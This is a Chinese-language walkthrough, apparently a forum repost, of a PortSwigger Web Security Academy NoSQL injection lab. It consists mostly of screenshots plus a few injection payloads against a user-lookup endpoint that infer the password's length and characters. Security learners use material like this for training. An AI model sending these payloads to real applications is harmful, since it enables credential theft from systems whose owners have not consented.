...
> **来源**: https://forum.butian.net/share/2856  
> **文章ID**: 2856
...
![nsql1.png](images/attach-14ba38ccb150248a3253a67c20f4b207ae32b045.png)  
这里首先是一个商城的界面，随便点击一个category  
url: /filter?category=Accessories  
可以看见这里有类似于查询的意思，我们输入一个单引号试试

![nosql2.png](images/attach-5fb07aad2d0328b5db186b88f8e07da418229612.png)  
可以看见报错了，报错内容：
...
![nosql3.png](images/attach-1eded93e106299869c2cad413c058bc20baae5f2.png)  
...
![nosql4.png](images/attach-afb2cb17a6cbbf5a190113baf63daa9f97181dbf.png)
...
![nosql5.png](images/attach-a40a7f6d00c11210ec78c068586cf847bd2d708f.png)  
抓个包看看
...
![nosql6.png](images/attach-0a641132dfe76a058df587c3c9be7567beb9b57b.png)
...
![nosql6 1.png](images/attach-5e1685d57680ebcd7dacc610513db186973bab5f.png)

发现有个lookup的文件进行搜索user：  
<https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener>

![nosql7.png](images/attach-e8b1a38bc176275bed098cf64cf82c5593b532b1.png)  
所以这里就尝试判断注入是否存在  
playload：  
<https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener>'

![nosql8.png](images/attach-231a84ddb1660265ec0f375d6d92a25c96d368db.png)  
<https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener>' && '1'=\\='1

![nosql9.png](images/attach-a9a1197ef95cf065b96ed2eb1f5ab7eb92772baa.png)  
...
![nosql10.png](images/attach-c48584b7d2b632fecb8158baa92b2873bace9ea9.png)  
<https://0xxxxxxxxxxxxxxxxxx.web-security-academy.net/user/lookup?user=wiener>' && this.password.length < 0 || 'a'='b

![nosql11.png](images/attach-2a986b6238472e72e42ef815bdb575047b3d9ebe.png)  
所以这里看见是可以对长度进行判断的，比如我们的密码是`peter`也就是5位那我们构造下length =\\=5也是为真的。

![nosql12.png](images/attach-4e10ef7e9d31f7278d9ea24f3bcf21a3b3203d08.png)  
接下来可以利用
...
![nosql13.png](images/attach-0eec8ccf1efa08efbd35b8b067510a9afca5d250.png)

![nosql14.png](images/attach-2db7526a045b5d37f33251ae2d653613c087e37b.png)
...
![nosql15.png](images/attach-58a9791d18870f6615b387b70c200aa14c1f9afc.png)
### measurement
...
![nosql16.png](images/attach-637cbb53e112a069cc67f1d19bb7f5def4cb64a5.png)  
发现了报错，也就是：
...
![nosql17.png](images/attach-f77465a300fab5aedc644c5c964c972f5f685d4e.png)  
当为`p`时：

![nosql18.png](images/attach-548eafcaf8b1bb983ed5eb1206d9a78adc432ef5.png)  
...
![nosql19.png](images/attach-c513450d5692dfc3fd52826f2922c1e43d042e5c.png)  
...
![nosql20.png](images/attach-71a1f1381e9a7fb6173ecfb2ae60be23bb5cb892.png)  
可以看见这里的值为1337
...
![nosql21.png](images/attach-9f83df6f2aabe30f01390aa5b5176180c0780d7a.png)  
所以可以构造playload：
...
![nosql22.png](images/attach-0aae0a544887700dc0f346c18cc8010f3fdb5d38.png)
